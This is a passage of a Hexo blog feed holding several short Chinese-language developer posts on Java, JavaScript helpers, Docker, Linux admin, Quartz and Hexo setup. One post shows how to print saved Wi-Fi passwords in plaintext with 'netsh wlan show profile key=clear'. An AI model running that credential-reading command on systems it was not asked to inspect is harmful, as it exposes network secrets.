<h3 id="correct-Example"><a href="#correct-Example" class="headerlink" title="correct Example"></a>correct Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">double c = 57.3;</span><br><span class="line"></span><br><span class="line">BigDecimal decimalC = new BigDecimal(Double.toString(c));</span><br><span class="line"></span><br><span class="line">System.out.println(decimalC);</span><br><span class="line"></span><br><span class="line">Output:57.3</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">double d = 57.3;</span><br><span class="line"></span><br><span class="line">BigDecimal decimalD = BigDecimal.valueOf(d);</span><br><span class="line"></span><br><span class="line">System.out.println(decimalD);</span><br><span class="line"></span><br><span class="line">Output:57.3</span><br><span class="line"></span><br><span class="line">結論:建議使用new BigDecimal(Double.toString(c)) and BigDecimal.valueOf(d)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Type Casting</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Type Casting</tag>
      </tags>
  </entry>
  <entry>
    <title>前端架構應用概念</title>
    <url>/posts/da550fe/</url>
    <content><![CDATA[<h3 id="前端架構應用概念"><a href="#前端架構應用概念" class="headerlink" title="前端架構應用概念"></a>前端架構應用概念</h3><span id="more"></span>
<p>這篇介紹幾個前端架構應用概念。<br>1.I18N物件<br>2.PageConfig<br>3.JCache</p>
<h3 id="I18N物件"><a href="#I18N物件" class="headerlink" title="I18N物件"></a>I18N物件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">主要是處理多國語言，因為有些彈出的訊息會需要用到多國語系，這邊跟Java一樣是可以帶參數的。</span><br><span class="line"></span><br><span class="line">I18N.setResource(&#123;</span><br><span class="line">	<span class="string">&#x27;form.text.sun&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.sun<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.mon&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.mon<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.tue&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.tue<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.wed&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.wed<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.thu&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.thu<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.fri&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.fri<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.sat&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.sat<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.today&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.today<span class="string">&quot;) %&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&#x27;form.text.close&#x27;</span>:<span class="string">&quot;&lt;%=langMessage.get(&quot;</span>form.text.close<span class="string">&quot;) %&gt;&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="PageConfig"><a href="#PageConfig" class="headerlink" title="PageConfig"></a>PageConfig</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">主要用於一些server端的設定，讓js檔案能取得相關的資訊，如果沒有靠這個介接，會導致很多javascript會需要放到jsp。</span><br><span class="line"></span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">if</span> (typeof (PageConfig) == <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">	PageConfig = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">PageConfig.currencySymbol = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JCache"><a href="#JCache" class="headerlink" title="JCache"></a>JCache</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如果需要重複拿某一個 dom element 來處理，記得使用 JCache 來取得 dom element，會比較有效率。</span><br><span class="line">不然每 call 一次 $(<span class="string">&#x27;#xxId&#x27;</span>) 都會搜尋整個 html document 重新把 <span class="built_in">id</span> 為 xxId 的 dom element select 出來。</span><br><span class="line">但是如果 dom element 會改變，就不能用 JCache，因為 JCache 會 cache 住舊版本的 dom element</span><br><span class="line">另外, 綁定 onclick 因為只會執行一次，就可以不用 JCache。</span><br><span class="line">例如 $(<span class="string">&#x27;#search-btn&#x27;</span>).click(<span class="function"><span class="title">function</span></span>() &#123;...&#125;);</span><br><span class="line"></span><br><span class="line">/*** JCache ***/</span><br><span class="line"><span class="keyword">if</span> (typeof (JCache) == <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">	JCache = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">	var pool = &#123;&#125;;</span><br><span class="line">	JCache.get = <span class="keyword">function</span>(element) &#123;</span><br><span class="line">		//Note:JCache.get(<span class="string">&#x27;xxx&#x27;</span>)可能回傳 null</span><br><span class="line">		<span class="keyword">if</span> (element == null || element.length == 0) &#123;</span><br><span class="line">			<span class="built_in">return</span> null;</span><br><span class="line">		&#125;</span><br><span class="line">		var result = pool[element];</span><br><span class="line">		<span class="keyword">if</span> (!result) &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				result = <span class="variable">$j</span>(element);</span><br><span class="line">				pool[element] = result;</span><br><span class="line">			&#125; catch (e) &#123;</span><br><span class="line">				console.error(e);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> result;</span><br><span class="line">	&#125;;</span><br><span class="line">	JCache.<span class="built_in">clone</span> = <span class="keyword">function</span>(element) &#123;</span><br><span class="line">		var obj = JCache.get(element);</span><br><span class="line">		<span class="keyword">if</span> (obj == null) &#123;</span><br><span class="line">			<span class="built_in">return</span> null;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> obj.clone();</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h3 id="const-js"><a href="#const-js" class="headerlink" title="const.js"></a>const.js</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">這是仿照Java的enum做出的設計，讓設計上會更有彈性，大部分會跟server端的enum <span class="built_in">type</span>做對應</span><br></pre></td></tr></table></figure>

<h3 id="JSUtil-js"><a href="#JSUtil-js" class="headerlink" title="JSUtil.js"></a>JSUtil.js</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">共用的工具類別，如果之後新瀏覽器javascript版本有提供相同功能，建議使用原生的</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>使用VisualStudioCompiler C語言</title>
    <url>/posts/bb92d4e1/</url>
    <content><![CDATA[<h3 id="使用VisualStudioCompiler-C語言"><a href="#使用VisualStudioCompiler-C語言" class="headerlink" title="使用VisualStudioCompiler C語言"></a>使用VisualStudioCompiler C語言</h3><span id="more"></span>
<p>這篇介紹如何使用VisualStudioCompiler C語言。Visual Studio 2019 在預設情境下沒有辦法直接建 C 專案，<br>只能建 C++ 專案。不過 Visual C++ 仍然保有編譯 C 原始碼的功能</p>
<h3 id="Visual-Studio-2019-安裝-lt-使用C-的桌面開發-gt"><a href="#Visual-Studio-2019-安裝-lt-使用C-的桌面開發-gt" class="headerlink" title="Visual Studio 2019 安裝&lt;使用C++的桌面開發&gt;"></a>Visual Studio 2019 安裝&lt;使用C++的桌面開發&gt;</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall1.png" width="50%" />

<h3 id="建立新專案-gt-主控台應用程式-C-Windows-主控台"><a href="#建立新專案-gt-主控台應用程式-C-Windows-主控台" class="headerlink" title="建立新專案 -&gt; 主控台應用程式 (C++ Windows 主控台)"></a>建立新專案 -&gt; 主控台應用程式 (C++ Windows 主控台)</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall2.png" width="50%" />

<h3 id="設定新的專案"><a href="#設定新的專案" class="headerlink" title="設定新的專案"></a>設定新的專案</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall3.png" width="50%" />

<h3 id="將HelloWorld-cpp刪除"><a href="#將HelloWorld-cpp刪除" class="headerlink" title="將HelloWorld.cpp刪除"></a>將HelloWorld.cpp刪除</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall4.png" width="50%" />

<h3 id="來源檔案-gt-右鍵-gt-新增項目-gt-main-c"><a href="#來源檔案-gt-右鍵-gt-新增項目-gt-main-c" class="headerlink" title="來源檔案 -&gt; 右鍵 -&gt; 新增項目 -&gt; main.c"></a>來源檔案 -&gt; 右鍵 -&gt; 新增項目 -&gt; main.c</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall5.png" width="50%" />

<h3 id="在main-c寫一個印出HelloWorld程式"><a href="#在main-c寫一個印出HelloWorld程式" class="headerlink" title="在main.c寫一個印出HelloWorld程式"></a>在main.c寫一個印出HelloWorld程式</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall6.png" width="50%" />

<h3 id="專案-gt-右鍵-gt-屬性-gt-C-x2F-C-gt-所有選項-gt-尋找選項或參數Key上-lt-編譯-gt-gt-編譯成-改成-編譯成C程式碼-x2F-TC"><a href="#專案-gt-右鍵-gt-屬性-gt-C-x2F-C-gt-所有選項-gt-尋找選項或參數Key上-lt-編譯-gt-gt-編譯成-改成-編譯成C程式碼-x2F-TC" class="headerlink" title="專案 -&gt; 右鍵 -&gt; 屬性 -&gt; C&#x2F;C++ -&gt; 所有選項 -&gt; 尋找選項或參數Key上&lt;編譯&gt; -&gt; 編譯成 改成 編譯成C程式碼(&#x2F;TC)"></a>專案 -&gt; 右鍵 -&gt; 屬性 -&gt; C&#x2F;C++ -&gt; 所有選項 -&gt; 尋找選項或參數Key上&lt;編譯&gt; -&gt; 編譯成 改成 編譯成C程式碼(&#x2F;TC)</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall7.png" width="50%" />

<h3 id="編譯成HelloWorld-exe-gt-執行exe"><a href="#編譯成HelloWorld-exe-gt-執行exe" class="headerlink" title="編譯成HelloWorld.exe -&gt; 執行exe"></a>編譯成HelloWorld.exe -&gt; 執行exe</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/VisualStudioInstall8.png" width="50%" />
]]></content>
      <categories>
        <category>VisualStudio</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>多台Server利用SelectForUpdate讓只有一台Server有執行權</title>
    <url>/posts/a4c74dbc/</url>
    <content><![CDATA[<h3 id="多台Server利用SelectForUpdate讓只有一台Server有執行權"><a href="#多台Server利用SelectForUpdate讓只有一台Server有執行權" class="headerlink" title="多台Server利用SelectForUpdate讓只有一台Server有執行權"></a>多台Server利用SelectForUpdate讓只有一台Server有執行權</h3><span id="more"></span>
<p>這種設計是同時讓多台Server做同一項功能，但一次只有一台Server能搶到優先執行權。<br>除了搶到執行權的Server，其它台可以當作備援Server使用，以防只有一台Server又發生<br>故障時，還有其它台Server可以執行。先執行到Select For update的會搶到執行權，<br>其它台Server進來會select到null直接跳掉。</p>
<h3 id="Select-For-Update"><a href="#Select-For-Update" class="headerlink" title="Select For Update"></a>Select For Update</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SELECT updatedate from systemsetting <span class="built_in">where</span> key = <span class="string">&#x27;function1&#x27;</span> FOR UPDATE;</span><br><span class="line"><span class="keyword">if</span> (updatedate != null) &#123;</span><br><span class="line">	//do one thing</span><br><span class="line">&#125;</span><br><span class="line">用以上設計，同時四台Server進來執行該SQL時，只會有一台Server會先拿到updatedate</span><br><span class="line">其它三台Server會拿到null，就只會有一台Server可以拿到執行權。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SelectForUpdate</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux上安裝OracleDocker</title>
    <url>/posts/426791de/</url>
    <content><![CDATA[<h3 id="在Linux上安裝OracleDocker"><a href="#在Linux上安裝OracleDocker" class="headerlink" title="在Linux上安裝OracleDocker"></a>在Linux上安裝OracleDocker</h3><span id="more"></span>
<p>在Linux上會有需要裝Oracle Docker的需求，來做一些CI&#x2F;CD的測試。</p>
<h3 id="提供Docker的網站"><a href="#提供Docker的網站" class="headerlink" title="提供Docker的網站"></a>提供Docker的網站</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://hub.docker.com/</span><br></pre></td></tr></table></figure>

<h3 id="INSTALL-DOCKER"><a href="#INSTALL-DOCKER" class="headerlink" title="INSTALL DOCKER"></a>INSTALL DOCKER</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Uninstall old versions</span><br><span class="line">$ yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latestlogrotate docker-logrotate docker-engine</span><br><span class="line"></span><br><span class="line">Install using the repository</span><br><span class="line">$ yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">$ yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">Install Docker Engine</span><br><span class="line">$ yum install –y docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">To install a specific version</span><br><span class="line">$ yum list docker-ce --showduplicates | <span class="built_in">sort</span></span><br><span class="line">$ yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io</span><br><span class="line"></span><br><span class="line">Start Docker</span><br><span class="line">$ systemctl start docker</span><br></pre></td></tr></table></figure>

<h3 id="DOWNLOAD-IMAGES"><a href="#DOWNLOAD-IMAGES" class="headerlink" title="DOWNLOAD IMAGES"></a>DOWNLOAD IMAGES</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Download images</span><br><span class="line">$ docker pull <span class="string">&quot;hub.docker.path&quot;</span></span><br><span class="line"></span><br><span class="line">Check image</span><br><span class="line">$ docker images</span><br></pre></td></tr></table></figure>

<h3 id="CREATE-CONTAINER"><a href="#CREATE-CONTAINER" class="headerlink" title="CREATE CONTAINER"></a>CREATE CONTAINER</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Create container</span><br><span class="line">$ docker run -d --name &lt;container_name&gt; --shm-size=1g -p 1521:1521 -p 18080:8080 -e ORACLE_PWD=&lt;your_password&gt; -v &lt;volume_name&gt;:/u01/app/oracle/oradata <span class="string">&quot;hub.docker.path&quot;</span></span><br><span class="line"></span><br><span class="line">Parameters</span><br><span class="line">--name The name of the container</span><br><span class="line">--shm-size Amount of Linux shared memory</span><br><span class="line">-p The port mapping of the host port to the container port.&lt;host_port&gt;:&lt;container_port&gt;</span><br><span class="line">-e The Oracle Database SYS, SYSTEM and PDB_ADMIN password</span><br><span class="line">-v The data volume to use <span class="keyword">for</span> the database. If omitted the database will not be persisted over container recreation.</span><br></pre></td></tr></table></figure>

<h3 id="ENTER-CONTAINER"><a href="#ENTER-CONTAINER" class="headerlink" title="ENTER CONTAINER"></a>ENTER CONTAINER</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Check container</span><br><span class="line">$ docker ps –a</span><br><span class="line"></span><br><span class="line">Start up sqlplus</span><br><span class="line">$ docker <span class="built_in">exec</span> -it &lt;container_name&gt; bash -c <span class="string">&quot;source /home/oracle/.bashrc; sqlplus /nolog&quot;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows上查詢Wi-Fi密碼</title>
    <url>/posts/36f1b8a/</url>
    <content><![CDATA[<h3 id="在Windows上查詢Wi-Fi密碼"><a href="#在Windows上查詢Wi-Fi密碼" class="headerlink" title="在Windows上查詢Wi-Fi密碼"></a>在Windows上查詢Wi-Fi密碼</h3><span id="more"></span>
<p>開啟cmd，執行以下指令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ netsh wlan show profile</span><br></pre></td></tr></table></figure>
<p>Output:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">介面 Wi-Fi 上的設定檔:</span><br><span class="line"></span><br><span class="line">群組原則設定檔 (唯讀)</span><br><span class="line">---------------------------------</span><br><span class="line">    &lt;無&gt;</span><br><span class="line"></span><br><span class="line">使用者設定檔</span><br><span class="line">-------------</span><br><span class="line">    所有使用者設定檔 : AAA</span><br><span class="line">    所有使用者設定檔 : BBB</span><br><span class="line">    所有使用者設定檔 : CCC</span><br><span class="line">    所有使用者設定檔 : DDD</span><br><span class="line">    所有使用者設定檔 : EEE</span><br></pre></td></tr></table></figure>

<p>開啟cmd，執行以下指令，請替換所有使用者設定檔的name。”金鑰內容”即是明文密碼。 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ netsh wlan show profile name=<span class="string">&quot;AAA&quot;</span> key=clear</span><br></pre></td></tr></table></figure>
<p>Output:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">介面 Wi-Fi 上的設定檔 AAA:</span><br><span class="line">=======================================================================</span><br><span class="line"></span><br><span class="line">已套用: 所有使用者設定檔</span><br><span class="line"></span><br><span class="line">設定檔資訊</span><br><span class="line">-------------------</span><br><span class="line">    版本                   : 1</span><br><span class="line">    類型                   : 無線區域網路</span><br><span class="line">    名稱                   : AAA</span><br><span class="line">    控制選項        :</span><br><span class="line">        連線模式           : 手動連線</span><br><span class="line">        網路廣播           : 只有此網路正在廣播時才連線</span><br><span class="line">        AutoSwitch         :不切換到其他網路</span><br><span class="line">        MAC 隨機化         ：已停用</span><br><span class="line"></span><br><span class="line">連線設定</span><br><span class="line">---------------------</span><br><span class="line">    SSID 數目              : 1</span><br><span class="line">    SSID 名稱              : <span class="string">&quot;AAA&quot;</span></span><br><span class="line">    網路類型               : 基礎結構</span><br><span class="line">    無線電波類型           : [ 任何無線電波類型 ]</span><br><span class="line">    廠商擴充                  : 不存在</span><br><span class="line"></span><br><span class="line">安全性設定</span><br><span class="line">-----------------</span><br><span class="line">    驗證                   : WPA2-Personal</span><br><span class="line">    加密方式               : CCMP</span><br><span class="line">    驗證                   : WPA2-Personal</span><br><span class="line">    加密方式               : GCMP</span><br><span class="line">    安全性金鑰             : 現在</span><br><span class="line">    金鑰內容               : 12345678</span><br><span class="line"></span><br><span class="line">成本設定</span><br><span class="line">-------------</span><br><span class="line">    成本                   : 不受限制</span><br><span class="line">    壅塞                   : 否</span><br><span class="line">    接近資料限制           : 否</span><br><span class="line">    超過資料限制           : 否</span><br><span class="line">    漫遊                   : 否</span><br><span class="line">    成本來源               : 預設值</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Wi-Fi</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Wi-Fi</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux上修改DNS設定</title>
    <url>/posts/f1db9e6f/</url>
    <content><![CDATA[<h3 id="在Linux上修改DNS設定"><a href="#在Linux上修改DNS設定" class="headerlink" title="在Linux上修改DNS設定"></a>在Linux上修改DNS設定</h3><span id="more"></span>
<p>這篇介紹如何修改Linux上的DNS設定。</p>
<h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vi /etc/sysconfig/network-scripts/ifcfg-ens160</span><br><span class="line"></span><br><span class="line">edit DNS1=1.1.1.1 -&gt; 8.8.8.8</span><br></pre></td></tr></table></figure>

<h3 id="service-network-restart"><a href="#service-network-restart" class="headerlink" title="service network restart"></a>service network restart</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ service network restart</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux上對新使用者建立crontab</title>
    <url>/posts/eda3f10f/</url>
    <content><![CDATA[<h3 id="在Linux上對新使用者建立crontab"><a href="#在Linux上對新使用者建立crontab" class="headerlink" title="在Linux上對新使用者建立crontab"></a>在Linux上對新使用者建立crontab</h3><span id="more"></span>
<p>這篇文章介紹如何在Linux上的新使用者建立自己的crontab。</p>
<h3 id="crontab指令"><a href="#crontab指令" class="headerlink" title="crontab指令"></a>crontab指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">--先切換root權限</span><br><span class="line">$ su -</span><br><span class="line">$ <span class="built_in">cd</span> /var/spool/cron/</span><br><span class="line">--建立新使用者的crontab</span><br><span class="line">$ crontab -u [username] -e</span><br><span class="line">--新增crontab指令</span><br><span class="line">$ 0 * * * * /usr/sbin/ntpdate time.stdtime.gov.tw &amp;&amp; /sbin/hwclock -w</span><br><span class="line">--修改權限</span><br><span class="line">$ sudo <span class="built_in">chown</span> [username] [username]</span><br><span class="line">$ sudo <span class="built_in">chown</span> :[group] [username]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>如何中斷正在運行的quartz作業</title>
    <url>/posts/4cd6705c/</url>
    <content><![CDATA[<h3 id="如何中斷正在運行的quartz作業"><a href="#如何中斷正在運行的quartz作業" class="headerlink" title="如何中斷正在運行的quartz作業"></a>如何中斷正在運行的quartz作業</h3><span id="more"></span>
<p>讓被鎖死的Thread能被強制中斷，可採用template method 設計模式<br>建立一個抽象類別InterruptableBaseJob並實作InterruptableJob。</p>
<h3 id="InterruptableBaseJob-Example"><a href="#InterruptableBaseJob-Example" class="headerlink" title="InterruptableBaseJob Example"></a>InterruptableBaseJob Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public abstract class InterruptableBaseJob implements InterruptableJob &#123;</span><br><span class="line"></span><br><span class="line">	protected AtomicReference&lt;Thread&gt; reference = new AtomicReference&lt;&gt;();</span><br><span class="line">	protected long executedTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">	public abstract void run(JobExecutionContext arg) throws JobExecutionException;</span><br><span class="line"></span><br><span class="line">	public void execute(JobExecutionContext arg) throws JobExecutionException &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			reference.set(Thread.currentThread());</span><br><span class="line">			executedTime = System.currentTimeMillis();</span><br><span class="line">			run(arg);</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			reference.set(null);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void <span class="function"><span class="title">interrupt</span></span>() &#123;</span><br><span class="line">		// 避免誤觸，讓超過20秒的才能被中斷</span><br><span class="line">		<span class="keyword">if</span> (System.currentTimeMillis() - executedTime &lt; 20 * 1000) &#123;</span><br><span class="line">			<span class="built_in">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Thread thread = reference.getAndSet(null);</span><br><span class="line">		<span class="keyword">if</span> (thread != null) &#123;</span><br><span class="line">			thread.interrupt();</span><br><span class="line">			LogUtils.system.info(<span class="string">&quot;interrupt &quot;</span> + getClass().getName());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="create-Job-have-to-extends-InterruptableBaseJob-Example"><a href="#create-Job-have-to-extends-InterruptableBaseJob-Example" class="headerlink" title="create Job have to extends InterruptableBaseJob Example"></a>create Job have to extends InterruptableBaseJob Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@DisallowConcurrentExecution</span><br><span class="line">public class XXXJob extends InterruptableBaseJob &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void run(final JobExecutionContext ctx) throws JobExecutionException &#123;</span><br><span class="line">		XXXCache.getInstance().update();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CronScheduler-Example"><a href="#CronScheduler-Example" class="headerlink" title="CronScheduler Example"></a>CronScheduler Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class CronScheduler &#123;</span><br><span class="line"></span><br><span class="line">	private static final CronScheduler instance = new CronScheduler();</span><br><span class="line">	private Scheduler scheduler;</span><br><span class="line"></span><br><span class="line">	private <span class="function"><span class="title">CronScheduler</span></span>() &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			this.scheduler = StdSchedulerFactory.getDefaultScheduler();</span><br><span class="line"></span><br><span class="line">			this.scheduler.start();</span><br><span class="line"></span><br><span class="line">		&#125; catch (SchedulerException e) &#123;</span><br><span class="line">			LogUtils.err.error(<span class="string">&quot;CronScheduler Error.&quot;</span>, e);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public final static CronScheduler <span class="function"><span class="title">getInstance</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	/**</span><br><span class="line">	 * 強制中斷任務</span><br><span class="line">	 * 因為刪除定時任務時，quartz還是會等之前的job完成，才會做移除跟新增job的動作，所以job被鎖死時，可考慮強制中斷</span><br><span class="line">	 * 能被強制中斷的job必須實作InterruptableJob</span><br><span class="line">	 * @param scheduleType</span><br><span class="line">	 * @throws SchedulerException</span><br><span class="line">	 */</span><br><span class="line">	// 中斷定時任務</span><br><span class="line">	public void interruptScheduleJob(ScheduleType scheduleType) throws SchedulerException &#123;</span><br><span class="line">		scheduler.interrupt(getJobKey(scheduleType));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="use-CronScheduler-interruptScheduleJob-method-Example"><a href="#use-CronScheduler-interruptScheduleJob-method-Example" class="headerlink" title="use CronScheduler interruptScheduleJob method Example"></a>use CronScheduler interruptScheduleJob method Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CronScheduler.getInstance().interruptScheduleJob(ScheduleType.XXXJob);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>quartz</tag>
      </tags>
  </entry>
  <entry>
    <title>如何取消vim編輯器的高亮模式</title>
    <url>/posts/10bcf830/</url>
    <content><![CDATA[<h3 id="如何取消vim編輯器的高亮模式"><a href="#如何取消vim編輯器的高亮模式" class="headerlink" title="如何取消vim編輯器的高亮模式"></a>如何取消vim編輯器的高亮模式</h3><span id="more"></span>
<p>在Linux上常常會按到shift + 3(#) or shift + 8(*)<br>將高亮模式叫出來，這篇介紹如何取消高亮模式。</p>
<h3 id="取消高亮模式指令"><a href="#取消高亮模式指令" class="headerlink" title="取消高亮模式指令"></a>取消高亮模式指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ :noh</span><br><span class="line">或</span><br><span class="line">$ :/aaa (随便的字母或数字都可)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>用Hexo建立Blog</title>
    <url>/posts/a927126d/</url>
    <content><![CDATA[<h3 id="手把手用Hexo建立個人Blog教學"><a href="#手把手用Hexo建立個人Blog教學" class="headerlink" title="手把手用Hexo建立個人Blog教學"></a>手把手用Hexo建立個人Blog教學</h3><span id="more"></span>
<p>Step1: Hexo事前安裝準備:node.js + Git。<br>Step2: 登入GitHub帳號並新增一個repository且Repository name 必須命名為 UserName + “.github.io”。<br>Step3: 使用Git Bash開啟指令視窗並輸入以下指令來獲得ssh-rsa key。<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;github UserName&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;github email&quot;</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;github email&quot;</span></span><br></pre></td></tr></table></figure><br>   Step3.1:接下來詢問都按Enter略過<br>Step4: 從ssh key文件預設位置 C:\Users\用戶名.ssh下，找到id_rsa.pub文件(文件內全都是key的一部分)。<br>Step5: 在GitHub -&gt; Setting -&gt; SSH and GPG keys，新增SSH keys<br>   Step5.1: Title任意取即可。<br>   Step5.2: key填入id_rsa.pub文件內所有內容。<br>Step6: 確認node.js 是否安裝成功<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">node --version</span><br></pre></td></tr></table></figure><br>Step7: 新增hexo blog資料夾，cmd -&gt; cd至資料夾 -&gt; 安裝hexo<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><br>Step8: 初始化blog<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure><br>Step9: cd 至資料夾\blog<br>Step10:新增新文章<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span 